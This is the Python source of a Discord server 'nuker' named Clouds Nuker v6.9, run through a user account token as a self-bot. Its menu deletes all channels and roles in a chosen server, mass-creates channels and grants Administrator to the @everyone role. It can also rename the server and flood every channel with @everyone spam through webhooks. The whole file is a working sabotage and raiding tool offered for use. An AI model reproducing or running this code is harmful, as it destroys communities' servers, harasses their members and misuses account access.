import discord
import configparser
import asyncio
from concurrent.futures import ThreadPoolExecutor
from pystyle import Center, Colorate, Colors
import os
import time

def loading_screen():
    os.system('cls')
    print(
        Center.XCenter(
            Colorate.Vertical(
                Colors.cyan_to_blue,   
                f"""
██╗      ██████╗  █████╗ ██████╗ ██╗███╗   ██╗ ██████╗ 
██║     ██╔═══██╗██╔══██╗██╔══██╗██║████╗  ██║██╔════╝ 
██║     ██║   ██║███████║██║  ██║██║██╔██╗ ██║██║  ███╗
██║     ██║   ██║██╔══██║██║  ██║██║██║╚██╗██║██║   ██║
███████╗╚██████╔╝██║  ██║██████╔╝██║██║ ╚████║╚██████╔╝
╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝            
        x,.-> please wait while the application is loading
    """,
                1,
            )
        )
    )

config = configparser.ConfigParser()
config.read('config.txt')

prefix = variable_value = config.get('config', 'prefix')

client = discord.Client()

async def show_server_info(guild):
    os.system('cls')
    print(
        Center.XCenter(
            Colorate.Vertical(
                Colors.cyan_to_blue,   
                f"""
             ██████╗██╗      ██████╗ ██╗   ██╗██████╗ ███████╗    ██████╗  █████╗ ██╗   ██╗███╗   ███╗
            ██╔════╝██║     ██╔═══██╗██║   ██║██╔══██╗██╔════╝    ██╔══██╗██╔══██╗╚██╗ ██╔╝████╗ ████║
            ██║     ██║     ██║   ██║██║   ██║██║  ██║███████╗    ██║  ██║███████║ ╚████╔╝ ██╔████╔██║
            ██║     ██║     ██║   ██║██║   ██║██║  ██║╚════██║    ██║  ██║██╔══██║  ╚██╔╝  ██║╚██╔╝██║
            ╚██████╗███████╗╚██████╔╝╚██████╔╝██████╔╝███████║    ██████╔╝██║  ██║   ██║   ██║ ╚═╝ ██║
             ╚═════╝╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝ ╚══════╝    ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚═╝
                                                           x,.-> logged in as {client.user}
                                                           x,.-> serving {len(client.guilds)} guild(s)
        """,
                1,
            )
        )
    )
    print(
            (
            Colorate.Vertical(
                Colors.cyan_to_blue,   
                f"""x,.-> Clouds Nuker v6.9
x,.-> made by r3xvert#0855

Prefix - "{prefix}"
Discord - https://discord.gg/WJGNdeQTCq
Note - Thanks for using my program
        """,
                1,
            )
        )
    )
    print(
            (
            Colorate.Vertical(
                Colors.cyan_to_blue,   
                f"""
[ Showing info of guild {guild.name} ]
------------------------------------------------------------

-> Name - {guild.name}
-> ID - {guild.id}
-> Channels - {len(guild.channels)}
-> Roles - {len(guild.roles)}

------------------------------------------------------------
        """,
                1,
            )
        )
    )
    input(Colorate.Vertical(Colors.cyan_to_blue, 'x,.->'))
    await nuke_menu(guild)

async def show_account_info():
    os.system('cls')
    print(
        Center.XCenter(
            Colorate.Vertical(
                Colors.cyan_to_blue,   
                f"""
             ██████╗██╗      ██████╗ ██╗   ██╗██████╗ ███████╗    ██████╗  █████╗ ██╗   ██╗███╗   ███╗
            ██╔════╝██║     ██╔═══██╗██║   ██║██╔══██╗██╔════╝    ██╔══██╗██╔══██╗╚██╗ ██╔╝████╗ ████║
            ██║     ██║     ██║   ██║██║   ██║██║  ██║███████╗    ██║  ██║███████║ ╚████╔╝ ██╔████╔██║
            ██║     ██║     ██║   ██║██║   ██║██║  ██║╚════██║    ██║  ██║██╔══██║  ╚██╔╝  ██║╚██╔╝██║
            ╚██████╗███████╗╚██████╔╝╚██████╔╝██████╔╝███████║    ██████╔╝██║  ██║   ██║   ██║ ╚═╝ ██║
             ╚═════╝╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝ ╚══════╝    ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚═╝
        """,
                1,
            )
        )
    )
    print(
            (
            Colorate.Vertical(
                Colors.cyan_to_blue,   
                f"""x,.-> Clouds Nuker v6.9
x,.-> made by r3xvert#0855

Prefix - "{prefix}"
Discord - https://discord.gg/WJGNdeQTCq
Note - Thanks for using my program
        """,
                1,
            )
        )
    )
    print(
            (
            Colorate.Vertical(
                Colors.cyan_to_blue,   
                f"""
[ Showing info of account {client.user} ]
------------------------------------------------------------


-> User - {client.user}
-> Guilds Joined - {len(client.guilds)}
-> Dm Channels - {len(client.private_channels)}
-> Friends - {len(client.user.friends)}
-> Avatar - {client.user.avatar_url}
-> Av. Ping - {round(client.latency * 1000, 2)}

------------------------------------------------------------
        """,
                1,
            )
        )
    )
    input(Colorate.Vertical(Colors.cyan_to_blue, 'x,.->'))
    await main_screen()

async def del_all_chans(guild):
    permissions = guild.me.guild_permissions
    if not permissions.manage_channels:
        print(Colorate.Vertical(Colors.cyan_to_blue,'The Bot Does not have the required permissions to do so !!'))
        time.sleep(2)
        await nuke_menu(guild)
    else:
        i = 1
        async def del_channel(channel):
            try:
                await channel.delete()
                print(Colorate.Vertical(Colors.cyan_to_blue, f'{i} ) Deleted channel {channel.name}'))
            except:
                print(Colorate.Vertical(Colors.cyan_to_blue, f'x,.-> Could not delete channel {channel.name}'))
        for channel in guild.channels:
            with ThreadPoolExecutor() as executor:
                executor.submit(asyncio.run_coroutine_threadsafe, await del_channel(channel), client.loop)
            i = i + 1
        await guild.create_text_channel(name='dabothub')
        print(Colorate.Vertical(Colors.cyan_to_blue, f'-> All channels deleted for guild {guild.name}'))
        time.sleep(2)
        await nuke_menu(guild)

async def del_all_roles(guild):
    permissions = guild.me.guild_permissions
    if not permissions.manage_roles:
        print(Colorate.Vertical(Colors.cyan_to_blue,'The Bot Does not have the required permissions to do so !!'))
        time.sleep(2)
        await nuke_menu(guild)
    else:
        i = 1
        for role in guild.roles:
            try:
                await role.delete()
                print(Colorate.Vertical(Colors.cyan_to_blue, f'{i} ) Deleted role {role.name}'))
                i = i + 1
            except:
                print(Colorate.Vertical(Colors.cyan_to_blue, f'-> Could not delete role {role.name}'))
        print(Colorate.Vertical(Colors.cyan_to_blue, f'-> {i} roles deleted for guild {guild.name}'))
        time.sleep(2)
        await nuke_menu(guild)

async def make_channels(guild):
    permissions = guild.me.guild_permissions
    if not permissions.manage_channels:
        print(Colorate.Vertical(Colors.cyan_to_blue,'The Bot Does not have the required permissions to do so !!'))
        time.sleep(2)
        await nuke_menu(guild)
    else:
        i = 1
        ai = 1
        print(Colorate.Vertical(Colors.cyan_to_blue, '-> Enter the name for the Channels to create'))
        channel_name = input(Colorate.Vertical(Colors.cyan_to_blue, 'x,.->'))
        print(Colorate.Vertical(Colors.cyan_to_blue, '-> Enter the number of channels to create'))
        amount = int(input(Colorate.Vertical(Colors.cyan_to_blue, 'x,.->')))
        for i in range(amount):
            try:
                await guild.create_text_channel(name=channel_name)
                print(Colorate.Vertical(Colors.cyan_to_blue, f'{ai} ) Created channel {channel_name}'))
                ai = ai + 1
                if ai == amount+1:
                    print(Colorate.Vertical(Colors.cyan_to_blue, f'-> {ai-1} channels created for guild {guild.name}'))
            except:
                print(Colorate.Vertical(Colors.cyan_to_blue, f'x,.-> Could not create channel {channel_name}'))
        time.sleep(2)
        await nuke_menu(guild)

async def admin_all(guild):
    permissions = guild.me.guild_permissions
    if not permissions.manage_roles:
        print(Colorate.Vertical(Colors.cyan_to_blue,'The Bot Does not have the required permissions to do so !!'))
        time.sleep(2)
        await nuke_menu(guild)
    try:
        # get the role object
        role = guild.default_role

        # create a Permissions object
        permissions = discord.Permissions()
        permissions.administrator = True  # set the desired permission

        # edit the role's permissions
        await role.edit(permissions=permissions)
        print(Colorate.Vertical(Colors.cyan_to_blue,  f'-> Added the permission Administrator to @everyone role'))
        time.sleep(2)
        await nuke_menu(guild)
    except:
        print(Colorate.Vertical(Colors.cyan_to_blue, 'An error occured or the account/bot does not have the required permissions to do so.'))
        time.sleep(2)
        await nuke_menu(guild)

async def rename_serv(guild):
    try:
        old_name = guild.name
        print(Colorate.Vertical(Colors.cyan_to_blue, '-> Enter the new name of the server'))
        srver_rename = input(Colorate.Vertical(Colors.cyan_to_blue, 'x,.->'))
        await guild.edit(name=srver_rename)
        print(Colorate.Vertical(Colors.cyan_to_blue, f'-> Renamed {old_name} to {guild.name}'))
        time.sleep(2)
        await nuke_menu(guild)
    except:
        print(Colorate.Vertical(Colors.cyan_to_blue, 'An error occurred or the account/bot does not have the required permissions to do so.'))
        time.sleep(2)
        await nuke_menu(guild)

async def spam_msgs(guild):
    permissions = guild.me.guild_permissions
    if not permissions.mention_everyone:
        print(Colorate.Vertical(Colors.cyan_to_blue,'The Bot Does not have the required permissions to do so !!'))
        time.sleep(2)
        await nuke_menu(guild)
        return

    print(Colorate.Vertical(Colors.cyan_to_blue, '-> Enter the message to send'))
    message = input(Colorate.Vertical(Colors.cyan_to_blue, 'x,.->'))
    print(Colorate.Vertical(Colors.cyan_to_blue, '-> Enter the amount of messages to send'))
    amount = int(input(Colorate.Vertical(Colors.cyan_to_blue, 'x,.->')))

    async def send_msgs(channel):
        print(Colorate.Vertical(Colors.cyan_to_blue, f'-> Starting to send messages in channel {channel.name}'))
        try:
            webhook = await channel.create_webhook(name='dabothub')
            for i in range(amount):
                await webhook.send(f'@everyone {message}')
        except:
            print(Exception)

    try:
        for channel in guild.channels:
            await send_msgs(channel)
        print(Colorate.Vertical(Colors.cyan_to_blue, f'-> {len(guild.channels) * amount} messages sent successfully in guild {guild.name}'))
        time.sleep(2)
        await nuke_menu(guild)
    except Exception as e:
        print(e)
        print(Colorate.Vertical(Colors.cyan_to_blue, 'An error occurred or the account/bot does not have the required permissions to do so.'))
        time.sleep(2)
        await nuke_menu(guild)


async def nuke_menu(guild):
    os.system('cls')
    print(
        Center.XCenter(
            Colorate.Vertical(
                Colors.cyan_to_blue,   
                f"""
             ██████╗██╗      ██████╗ ██╗   ██╗██████╗ ███████╗    ██████╗  █████╗ ██╗   ██╗███╗   ███╗
            ██╔════╝██║     ██╔═══██╗██║   ██║██╔══██╗██╔════╝    ██╔══██╗██╔══██╗╚██╗ ██╔╝████╗ ████║
            ██║     ██║     ██║   ██║██║   ██║██║  ██║███████╗    ██║  ██║███████║ ╚████╔╝ ██╔████╔██║
            ██║     ██║     ██║   ██║██║   ██║██║  ██║╚════██║    ██║  ██║██╔══██║  ╚██╔╝  ██║╚██╔╝██║
            ╚██████╗███████╗╚██████╔╝╚██████╔╝██████╔╝███████║    ██████╔╝██║  ██║   ██║   ██║ ╚═╝ ██║
             ╚═════╝╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝ ╚══════╝    ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚═╝
        """,
                1,
            )
        )
    )
    print(
            (
            Colorate.Vertical(
                Colors.cyan_to_blue,   
                f"""x,.-> Clouds Nuker v6.9
x,.-> made by r3xvert#0855

Prefix - "{prefix}"
Discord - https://discord.gg/WJGNdeQTCq
Note - Thanks for using my program
        """,
                1,
            )
        )
    )
    print(
            (
            Colorate.Vertical(
                Colors.cyan_to_blue,   
                f"""[ Server Nuker / Select a 0ption ]
------------------------------------------------------------

-> 0 - Go to Main Menu
-> 1 - See Server Info
-> 2 - Delete all channels
-> 3 - Create channels
-> 4 - Admin ALL
-> 5 - Rename server
-> 6 - Delete all roles
-> 7 - Send messages in all channels

------------------------------------------------------------
        """,
                1,
            )
        )
    )
    async def choice3():
        choice = input(Colorate.Vertical(Colors.cyan_to_blue, 'x,.->'))
        if choice == '0':
            await main_screen()
        elif choice == '1':
            await show_server_info(guild)
        elif choice == '2':
            await del_all_chans(guild)
        elif choice == '3':
            await make_channels(guild)
        elif choice == '4':
            await admin_all(guild)
        elif choice == '5':
            await rename_serv(guild)
        elif choice == '6':
            await del_all_roles(guild)
        elif choice == '7':
            await spam_msgs(guild)
        else:
            await choice3()

    await choice3()

async def nuke_server():
    os.system('cls')
    print(
        Center.XCenter(
            Colorate.Vertical(
                Colors.cyan_to_blue,   
                f"""
             ██████╗██╗      ██████╗ ██╗   ██╗██████╗ ███████╗    ██████╗  █████╗ ██╗   ██╗███╗   ███╗
            ██╔════╝██║     ██╔═══██╗██║   ██║██╔══██╗██╔════╝    ██╔══██╗██╔══██╗╚██╗ ██╔╝████╗ ████║
            ██║     ██║     ██║   ██║██║   ██║██║  ██║███████╗    ██║  ██║███████║ ╚████╔╝ ██╔████╔██║
            ██║     ██║     ██║   ██║██║   ██║██║  ██║╚════██║    ██║  ██║██╔══██║  ╚██╔╝  ██║╚██╔╝██║
            ╚██████╗███████╗╚██████╔╝╚██████╔╝██████╔╝███████║    ██████╔╝██║  ██║   ██║   ██║ ╚═╝ ██║
             ╚═════╝╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝ ╚══════╝    ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚═╝
        """,
                1,
            )
        )
    )
    print(
            (
            Colorate.Vertical(
                Colors.cyan_to_blue,   
                f"""x,.-> Clouds Nuker v6.9
x,.-> made by r3xvert#0855

Prefix - "{prefix}"
Discord - https://discord.gg/WJGNdeQTCq
Note - Thanks for using my program
        """,
                1,
            )
        )
    )
    print(Colorate.Vertical(Colors.cyan_to_blue, '-> Listing all the servers of the selected user'))
    time.sleep(2)
    i = 1
    for guild in client.guilds:
        print(Colorate.Vertical(Colors.cyan_to_blue, f'{i} ) {guild.name} - {guild.id}'))
        i = i + 1
    time.sleep(0.4)
    print(Colorate.Vertical(Colors.cyan_to_blue, '-> Please enter the ID of the server you are trying to nuke ( Enter 0 to go back to main menu )'))
    async def choice2():
        choice = input(Colorate.Vertical(Colors.cyan_to_blue, 'x,.->'))
        if choice == '0':
            await main_screen()
        else:
            try:
                for guild in client.guilds:
                    if str(guild.id) == choice:
                        server = guild
                    else:
                        pass
                if server is None:
                    print(Colorate.Vertical(Colors.cyan_to_blue, f'-> The user is not in a server with that ID, please retry.'))
                    await choice2()
                print(Colorate.Vertical(Colors.cyan_to_blue, f'-> Guild with name {server.name} and ID {server.id} Selected.'))
                await asyncio.sleep(2)
                await nuke_menu(server)
            except:
                print(Colorate.Vertical(Colors.cyan_to_blue, '-> Please check your server ID, press enter to retry'))
                await choice2()
    await choice2()

async def list_servers():
    os.system('cls')
    print(
        Center.XCenter(
            Colorate.Vertical(
                Colors.cyan_to_blue,   
                f"""
             ██████╗██╗      ██████╗ ██╗   ██╗██████╗ ███████╗    ██████╗  █████╗ ██╗   ██╗███╗   ███╗
            ██╔════╝██║     ██╔═══██╗██║   ██║██╔══██╗██╔════╝    ██╔══██╗██╔══██╗╚██╗ ██╔╝████╗ ████║
            ██║     ██║     ██║   ██║██║   ██║██║  ██║███████╗    ██║  ██║███████║ ╚████╔╝ ██╔████╔██║
            ██║     ██║     ██║   ██║██║   ██║██║  ██║╚════██║    ██║  ██║██╔══██║  ╚██╔╝  ██║╚██╔╝██║
            ╚██████╗███████╗╚██████╔╝╚██████╔╝██████╔╝███████║    ██████╔╝██║  ██║   ██║   ██║ ╚═╝ ██║
             ╚═════╝╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝ ╚══════╝    ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚═╝
        """,
                1,
            )
        )
    )
    print(
            (
            Colorate.Vertical(
                Colors.cyan_to_blue,   
                f"""x,.-> Clouds Nuker v6.9
x,.-> made by r3xvert#0855

Prefix - "{prefix}"
Discord - https://discord.gg/WJGNdeQTCq
Note - Thanks for using my program
        """,
                1,
            )
        )
    )
    i = 1
    for guild in client.guilds:
        print(Colorate.Vertical(Colors.cyan_to_blue, f'{i} ) {guild.name} - {guild.id}'))
        i = i + 1
    input(Colorate.Vertical(Colors.cyan_to_blue, 'x,.->'))
    await main_screen()

async def main_screen():
    os.system('cls')
    print(
        Center.XCenter(
            Colorate.Vertical(
                Colors.cyan_to_blue,   
                f"""
             ██████╗██╗      ██████╗ ██╗   ██╗██████╗ ███████╗    ██████╗  █████╗ ██╗   ██╗███╗   ███╗
            ██╔════╝██║     ██╔═══██╗██║   ██║██╔══██╗██╔════╝    ██╔══██╗██╔══██╗╚██╗ ██╔╝████╗ ████║
            ██║     ██║     ██║   ██║██║   ██║██║  ██║███████╗    ██║  ██║███████║ ╚████╔╝ ██╔████╔██║
            ██║     ██║     ██║   ██║██║   ██║██║  ██║╚════██║    ██║  ██║██╔══██║  ╚██╔╝  ██║╚██╔╝██║
            ╚██████╗███████╗╚██████╔╝╚██████╔╝██████╔╝███████║    ██████╔╝██║  ██║   ██║   ██║ ╚═╝ ██║
             ╚═════╝╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝ ╚══════╝    ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚═╝
                                                           x,.-> logged in as {client.user}
                                                           x,.-> serving {len(client.guilds)} guild(s)
        """,
                1,
            )
        )
    )
    print(
            (
            Colorate.Vertical(
                Colors.cyan_to_blue,   
                f"""x,.-> Clouds Nuker v6.9
x,.-> made by r3xvert#0855

Prefix - "{prefix}"
Discord - https://discord.gg/WJGNdeQTCq
Note - Thanks for using my program
        """,
                1,
            )
        )
    )
    print(
            (
            Colorate.Vertical(
                Colors.cyan_to_blue,   
                f"""[ Server Nuker / Select a 0ption ]
------------------------------------------------------------

-> 0 - Show account info
-> 1 - List Servers
-> 2 - Nuke a server
-> 3 - Go back to main menu

------------------------------------------------------------
        """,
                1,
            )
        )
    )

    async def choice1():
        choice = input(Colorate.Vertical(Colors.cyan_to_blue, 'x,.->'))
        if choice == '0':
            await show_account_info()
            await choice1()
        elif choice == '1':
            await list_servers()
            await choice1()
        elif choice == '2':
            await nuke_server()
            await choice1()
        elif choice == '3':
            os.system('python launcher.py')
        else:
            await choice1()
    await choice1()

@client.event
async def on_ready():
    await main_screen()

def start_self_nuker():
    print(Colorate.Vertical(Colors.cyan_to_blue, 'x,.-> Enter your Account Token :'))
    token = input(Colorate.Vertical(Colors.cyan_to_blue, 'x,.->'))
    loading_screen()
    try:
        client.run(token, bot=False)
    except discord.LoginFailure:
        os.system('cls')
        print(
        Center.XCenter(
            Colorate.Vertical(
                Colors.red_to_yellow,   
                f"""
███████╗██████╗ ██████╗  ██████╗ ██████╗ 
██╔════╝██╔══██╗██╔══██╗██╔═══██╗██╔══██╗
█████╗  ██████╔╝██████╔╝██║   ██║██████╔╝
██╔══╝  ██╔══██╗██╔══██╗██║   ██║██╔══██╗
███████╗██║  ██║██║  ██║╚██████╔╝██║  ██║
╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝ 
                            x,.- made by r3xvert#0855
                            x,.- https://discord.gg/WJGNdeQTCq
    """,
                1,
            )
        )
    )
        print(
        Center.XCenter(
            Colorate.Vertical(
                Colors.red_to_yellow,   
                f"""
    x,.- The token that you input was invalid. Please restart the tool
    x,.- contact r3xvert#0855 or join https://discord.gg/WJGNdeQTCq for help
    """,
                1,
            )
        )
    )
        input(Colorate.Vertical(Colors.red_to_yellow, 'x,.->'))
        time.sleep(2)
